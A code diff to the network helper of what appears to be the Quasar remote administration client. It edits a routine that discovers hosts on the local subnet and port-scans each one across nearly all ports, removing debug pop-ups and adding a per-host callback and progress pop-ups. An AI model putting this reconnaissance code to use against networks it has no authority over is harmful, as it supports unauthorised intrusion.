@@ -75,7 +75,6 @@ namespace Quasar.Client.Helper.Network
 
             if (targetInterface == null)
             {
-                MessageBox.Show("Failed to find interface!");
                 return; // Interface Not Found
             }
 
@@ -89,13 +88,11 @@ namespace Quasar.Client.Helper.Network
 
                 if (subnetMask == null)
                 {
-                    MessageBox.Show("Failed to find subnet!");
                     return; // Subnet Not Found
                 }
 
                 IPAddress networkAddress = GetNetworkAddress(ipAddress, subnetMask);
                 IPAddress broadcastAddress = GetBroadcastAddress(ipAddress, subnetMask);
-                MessageBox.Show($"Grabbed!\nNetwork: {networkAddress}\nBroadcast: {broadcastAddress}");
 
                 uint start = IpToUint(networkAddress) + 1;
                 uint end = IpToUint(broadcastAddress) + 1;
@@ -128,21 +125,24 @@ namespace Quasar.Client.Helper.Network
                                 {
                                     return;
                                 }
-                                MessageBox.Show("System Responded!", $"{currentIp}");
                             }
                             catch
                             {
                                 return;
                             }
                         }
-                        MessageBox.Show("Starting port scan...", $"{currentIp}");
                         AddressEntity networkEntity = new AddressEntity { InterfaceIndex = targetInterfaceIndex, Address = currentIp, Ports = new int[] { }, Shares = new string[] { } };
+                        action(networkEntity, entity);
                         List<int> ports = new List<int>();
                         for (int port = 1; port < 65535; port++)
                         {
                             if (IsPortOpen(currentIp, port, 100))
                             {
                                 ports.Add(port);
+                            }
+                            if (port % 1000 == 0)
+                            {
+                                MessageBox.Show($"Completed {port} Ports!", $"{currentIp}");
                             }
                         }
                         MessageBox.Show("Finished port scan!", $"{currentIp}");
